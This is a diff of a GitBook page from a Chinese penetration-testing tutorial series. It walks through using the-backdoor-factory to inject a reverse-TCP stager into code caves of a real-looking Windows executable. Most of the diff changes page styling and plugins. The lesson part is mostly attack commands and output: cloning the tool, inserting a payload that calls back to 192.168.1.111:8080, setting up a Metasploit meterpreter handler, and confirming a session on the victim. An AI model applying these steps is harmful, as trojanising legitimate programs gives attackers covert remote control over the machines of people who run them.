@@ -1,14 +1,14 @@
 
 <!DOCTYPE HTML>
-<html lang="" >
+<html lang="zh-hans" >
     <head>
         <meta charset="UTF-8">
         <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
-        <title>第九课：工具介绍-the-backdoor-factory · GitBook</title>
+        <title>第九课：工具介绍-the-backdoor-factory · Micro8 系列教程</title>
         <meta http-equiv="X-UA-Compatible" content="IE=edge" />
         <meta name="description" content="">
         <meta name="generator" content="GitBook 3.2.3">
-        
+        <meta name="author" content="Micro8 系列作者">
         
         
     
@@ -17,17 +17,33 @@
     
             
                 
-                <link rel="stylesheet" href="../gitbook/gitbook-plugin-highlight/website.css">
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search-plus/search.css">
                 
             
                 
-                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search/search.css">
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-prism/prism-darcula.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-splitter/splitter.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-tbfed-pagefooter/footer.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-donate/plugin.css">
                 
             
                 
                 <link rel="stylesheet" href="../gitbook/gitbook-plugin-fontsettings/website.css">
                 
             
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-theme-comscore/test.css">
+                
+            
         
 
     
@@ -47,6 +63,7 @@
     
 
         
+    
     
     
     <meta name="HandheldFriendly" content="true"/>
@@ -63,6 +80,17 @@
     <link rel="prev" href="8_模拟诉求任务攻击.html" />
     
 
+    <style>
+    @media only screen and (max-width: 640px) {
+        .book-header .hidden-mobile {
+            display: none;
+        }
+    }
+    </style>
+    <script>
+        window["gitbook-plugin-github-buttons"] = {"repo":"https://github.com/Micropoor/Micro8","types":["star","watch","fork"],"size":"small"};
+    </script>
+
     </head>
     <body>
         
@@ -71,7 +99,7 @@
         
             
 <div id="book-search-input" role="search">
-    <input type="text" placeholder="Type to search" />
+    <input type="text" placeholder="输入并搜索" />
 </div>
 
             
@@ -82,7 +110,21 @@
 <ul class="summary">
     
     
+    
+        
+        <li>
+            <a href="https://micropoor.blogspot.com" target="_blank" class="custom-link">Micropoor</a>
+        </li>
+    
+        
+        <li>
+            <a href="https://github.com/micro8" target="_blank" class="custom-link">Github Micro8</a>
+        </li>
+    
+    
 
+    
+    <li class="divider"></li>
     
 
     
@@ -1785,7 +1827,7 @@
 
     <li>
         <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
-            Published with GitBook
+            本书使用 GitBook 发布
         </a>
     </li>
 </ul>
@@ -1818,7 +1860,7 @@
                     <div class="page-wrapper" tabindex="-1" role="main">
                         <div class="page-inner">
                             
-<div id="book-search-results">
+<div class="search-plus" id="book-search-results">
     <div class="search-noresults">
     
                                 <section class="normal markdown-section">
@@ -1828,47 +1870,47 @@
 <h3 id="&#x539F;&#x7406;">&#x539F;&#x7406;</h3>
 <p>&#x53EF;&#x6267;&#x884C;&#x4E8C;&#x8FDB;&#x5236;&#x6587;&#x4EF6;&#x4E2D;&#x6709;&#x5927;&#x91CF;&#x7684; 00&#xFF0C;&#x8FD9;&#x4E9B; 00 &#x662F;&#x4E0D;&#x5305;&#x542B;&#x6570;&#x636E;&#x7684;&#xFF0C;&#x5C06;&#x8FD9;&#x4E9B;&#x6570;&#x636E;&#x66FF;&#x6362;&#x6210; payload&#xFF0C;&#x5E76;&#x4E14;&#x5728;&#x7A0B;&#x5E8F;&#x6267;&#x884C;&#x7684;&#x65F6;&#x5019;&#xFF0C;jmp &#x5230;&#x4EE3;&#x7801;&#x6BB5;&#xFF0C;&#x6765;&#x89E6;&#x53D1; payload&#x3002;</p>
 <h3 id="&#x4EE5;&#x9879;&#x76EE;&#x4E2D;&#x7684;&#x8FC7;&#x78C5;&#x7CFB;&#x7EDF;&#x4E3A;&#x4F8B;&#xFF1A;">&#x4EE5;&#x9879;&#x76EE;&#x4E2D;&#x7684;&#x8FC7;&#x78C5;&#x7CFB;&#x7EDF;&#x4E3A;&#x4F8B;&#xFF1A;</h3>
-<pre><code class="lang-bash">root@John:~/Desktop<span class="hljs-comment"># git clone https://github.com/secretsquirrel/the-backdoor-factory.git </span>
+<pre class="language-"><code class="lang-bash">root@John:~/Desktop<span class="token comment"># git clone https://github.com/secretsquirrel/the-backdoor-factory.git </span>
 //&#x5B89;&#x88C5;the-backdoor-factory
 </code></pre>
 <p><img src="media/baa5f2ef8bc4b8332d377e179c2897d1.jpg" alt=""></p>
-<pre><code class="lang-bash">root@John:~/Desktop/the-backdoor-factory<span class="hljs-comment"># ./backdoor.py -f ~/demo/guobang.exe -S </span>
+<pre class="language-"><code class="lang-bash">root@John:~/Desktop/the-backdoor-factory<span class="token comment"># ./backdoor.py -f ~/demo/guobang.exe -S </span>
 //&#x68C0;&#x6D4B;&#x662F;&#x5426;&#x652F;&#x6301;&#x540E;&#x95E8;&#x690D;&#x5165;
 </code></pre>
 <p><img src="media/65f5db4ee779eaacdff8a20bdfd35ea8.jpg" alt=""></p>
-<pre><code class="lang-bash">root@John:~/Desktop/the-backdoor-factory<span class="hljs-comment"># ./backdoor.py -f ~/demo/guobang.exe -c -l 150 </span>
+<pre class="language-"><code class="lang-bash">root@John:~/Desktop/the-backdoor-factory<span class="token comment"># ./backdoor.py -f ~/demo/guobang.exe -c -l 150 </span>
 //&#x6D4B;&#x8BD5;&#x88C2;&#x7F1D;&#x7A7A;&#x95F4;size150
 </code></pre>
 <p><img src="media/2b8e42c3fe1195f37bf7b01fb31af21b.jpg" alt=""></p>
-<pre><code class="lang-bash">root@John:~/Desktop/the-backdoor-factory<span class="hljs-comment"># ./backdoor.py -f ~/demo/guobang.exe -s show </span>
+<pre class="language-"><code class="lang-bash">root@John:~/Desktop/the-backdoor-factory<span class="token comment"># ./backdoor.py -f ~/demo/guobang.exe -s show </span>
 //&#x67E5;&#x770B;&#x53EF;&#x7528;payload
 </code></pre>
 <p><img src="media/c576aabd967bcbbf39467dcf40ec2759.jpg" alt=""></p>
-<pre><code class="lang-bash">root@John:~/Desktop/the-backdoor-factory<span class="hljs-comment"># ./backdoor.py -f ~/demo/guobang.exe -H 192.168.1.111 -P 8080 -s iat_reverse_tcp_stager_threaded </span>
+<pre class="language-"><code class="lang-bash">root@John:~/Desktop/the-backdoor-factory<span class="token comment"># ./backdoor.py -f ~/demo/guobang.exe -H 192.168.1.111 -P 8080 -s iat_reverse_tcp_stager_threaded </span>
 //&#x63D2;&#x5165;payload&#xFF0C;&#x5E76;&#x751F;&#x6210;&#x6587;&#x4EF6;&#x3002;
 </code></pre>
 <p><img src="media/1dbc7c753b5135a67db8ac3bee6f3352.jpg" alt=""></p>
-<pre><code class="lang-bash">root@John:~/Desktop/the-backdoor-factory<span class="hljs-comment"># md5sum ./guobang.exe /root/demo/guobang.exe</span>
+<pre class="language-"><code class="lang-bash">root@John:~/Desktop/the-backdoor-factory<span class="token comment"># md5sum ./guobang.exe /root/demo/guobang.exe</span>
 //&#x5BF9;&#x6BD4;&#x539F;&#x6587;&#x4EF6;&#x4E0E;&#x751F;&#x6210;&#x6587;&#x4EF6;MD5&#x503C;
 </code></pre>
 <p><img src="media/999c8d02e798b61f61a4d8cd284ffd0b.jpg" alt=""></p>
-<pre><code class="lang-bash">root@John:~/Desktop/the-backdoor-factory<span class="hljs-comment"># du -k ./guobang.exe /root/demo/guobang.exe</span>
+<pre class="language-"><code class="lang-bash">root@John:~/Desktop/the-backdoor-factory<span class="token comment"># du -k ./guobang.exe /root/demo/guobang.exe</span>
 //&#x5BF9;&#x6BD4;&#x6587;&#x4EF6;&#x5927;&#x5C0F;
 </code></pre>
 <p><img src="media/edd13750f6b3e03121e63e805b4a5b97.jpg" alt=""></p>
-<pre><code class="lang-bash">msf &gt; use exploit/multi/handler
-msf exploit(handler) &gt; <span class="hljs-built_in">set</span> payload windows/meterpreter/reverse_tcp 
-payload =&gt; windows/meterpreter/reverse_tcp
-msf exploit(handler) &gt; <span class="hljs-built_in">set</span> lhost 192.168.1.111
-lhost =&gt; 192.168.1.111
-msf exploit(handler) &gt; <span class="hljs-built_in">set</span> lport 8080
-lport =&gt; 8080
-msf exploit(handler) &gt; exploit -j 
+<pre class="language-"><code class="lang-bash">msf <span class="token operator">&gt;</span> use exploit/multi/handler
+msf exploit<span class="token punctuation">(</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token keyword">set</span> payload windows/meterpreter/reverse_tcp 
+payload <span class="token operator">=</span><span class="token operator">&gt;</span> windows/meterpreter/reverse_tcp
+msf exploit<span class="token punctuation">(</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token keyword">set</span> lhost 192.168.1.111
+lhost <span class="token operator">=</span><span class="token operator">&gt;</span> 192.168.1.111
+msf exploit<span class="token punctuation">(</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token keyword">set</span> lport 8080
+lport <span class="token operator">=</span><span class="token operator">&gt;</span> 8080
+msf exploit<span class="token punctuation">(</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit -j 
 //&#x5F00;&#x542F;&#x672C;&#x5730;&#x76D1;&#x542C;
 </code></pre>
 <p><img src="media/94330fb03737c7e42549f1b9b3a8bb21.jpg" alt=""></p>
 <p>//&#x6253;&#x5F00;&#x8F6F;&#x4EF6;<br><img src="media/2139e4a1c0c1e326605cf246742ff3a5.jpg" alt=""></p>
-<pre><code class="lang-bash">meterpreter &gt; getuid
+<pre class="language-"><code class="lang-bash">meterpreter <span class="token operator">&gt;</span> getuid
 Server username: John-PC\John
 </code></pre>
 <p>//&#x786E;&#x5B9A;&#x76EE;&#x6807;  </p>
@@ -1876,7 +1918,9 @@ Server username: John-PC\John
 <blockquote>
 <p>  Micropoor</p>
 </blockquote>
-
+<footer class="page-footer"><span class="copyright">Copyright &#xA9; Micro8 2018 all right reserved&#xFF0C;powered by Gitbook</span><span class="footer-modification">&#x4FEE;&#x8BA2;&#x65F6;&#x95F4;&#xFF1A;
+2019-02-23 15:07
+</span></footer>
                                 
                                 </section>
                             
@@ -1919,7 +1963,7 @@ Server username: John-PC\John
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"title":"第九课：工具介绍-the-backdoor-factory","level":"1.4.9","depth":2,"next":{"title":"第十课：msfvenom常用生成payload命令","level":"1.4.10","depth":2,"path":"Chapter1/10_msfvenom常用生成payload命令.md","ref":"Chapter1/10_msfvenom常用生成payload命令.md","articles":[]},"previous":{"title":"第八课：模拟诉求任务攻击","level":"1.4.8","depth":2,"path":"Chapter1/8_模拟诉求任务攻击.md","ref":"Chapter1/8_模拟诉求任务攻击.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":[],"pluginsConfig":{"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"Chapter1/9_工具介绍-the-backdoor-factory.md","mtime":"2019-02-23T07:07:37.917Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2019-02-25T04:00:06.266Z"},"basePath":"..","book":{"language":""}});
+            gitbook.page.hasChanged({"page":{"title":"第九课：工具介绍-the-backdoor-factory","level":"1.4.9","depth":2,"next":{"title":"第十课：msfvenom常用生成payload命令","level":"1.4.10","depth":2,"path":"Chapter1/10_msfvenom常用生成payload命令.md","ref":"Chapter1/10_msfvenom常用生成payload命令.md","articles":[]},"previous":{"title":"第八课：模拟诉求任务攻击","level":"1.4.8","depth":2,"path":"Chapter1/8_模拟诉求任务攻击.md","ref":"Chapter1/8_模拟诉求任务攻击.md","articles":[]},"dir":"ltr"},"config":{"plugins":["-lunr","-search","search-plus","-highlight","prism","theme-comscore","splitter","-sharing","sharing-plus","-expandable-chapters-small","simple-page-toc","github","github-buttons","tbfed-pagefooter","donate","ga"],"root":".","styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"tbfed-pagefooter":{"copyright":"Copyright © Micro8 2018","modify_label":"修订时间：","modify_format":"YYYY-MM-DD HH:mm"},"prism":{"css":["prism-themes/themes/prism-darcula.css"]},"github":{"url":"https://github.com/micro8"},"simple-page-toc":{"maxDepth":3,"skipFirstH1":true},"splitter":{},"sharing-plus":{"qq":false,"all":["facebook","google","twitter","instapaper","linkedin","pocket","stumbleupon"],"douban":false,"facebook":true,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":true,"messenger":false,"line":false,"vk":false,"pocket":true,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"donate":{"alipay":"","alipayText":"支付宝打赏","button":"赞赏码","title":"有读者问赞赏码，如下，自愿：","wechat":"./dashang.png","wechatText":""},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-comscore":{},"github-buttons":{"repo":"https://github.com/Micropoor/Micro8","types":["star","watch","fork"],"size":"small"},"ga":{"configuration":"auto","token":"UA-135003278-1"},"sharing":{"qq":false,"all":["facebook","google","twitter","weibo","instapaper","linkedin","pocket","stumbleupon"],"douban":false,"facebook":false,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":false,"messenger":false,"line":false,"vk":false,"pocket":false,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"search-plus":{}},"theme":"default","author":"Micro8 系列作者","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"Micro8 系列教程","language":"zh-hans","links":{"sidebar":{"Micropoor":"https://micropoor.blogspot.com","Github Micro8":"https://github.com/micro8"}},"gitbook":"*","description":"Micro8"},"file":{"path":"Chapter1/9_工具介绍-the-backdoor-factory.md","mtime":"2019-02-23T07:07:37.917Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2019-02-25T13:55:17.972Z"},"basePath":"..","book":{"language":""}});
         });
     </script>
 </div>
@@ -1929,27 +1973,43 @@ Server username: John-PC\John
     <script src="../gitbook/theme.js"></script>
     
         
-        <script src="../gitbook/gitbook-plugin-search/search-engine.js"></script>
+        <script src="../gitbook/gitbook-plugin-search-plus/jquery.mark.min.js"></script>
         
     
         
-        <script src="../gitbook/gitbook-plugin-search/search.js"></script>
+        <script src="../gitbook/gitbook-plugin-search-plus/search.js"></script>
         
     
         
-        <script src="../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
+        <script src="../gitbook/gitbook-plugin-splitter/splitter.js"></script>
         
     
         
-        <script src="../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
+        <script src="../gitbook/gitbook-plugin-sharing-plus/buttons.js"></script>
         
     
         
-        <script src="../gitbook/gitbook-plugin-sharing/buttons.js"></script>
+        <script src="../gitbook/gitbook-plugin-github/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-github-buttons/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-donate/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-ga/plugin.js"></script>
         
     
         
         <script src="../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-theme-comscore/test.js"></script>
         
     
 
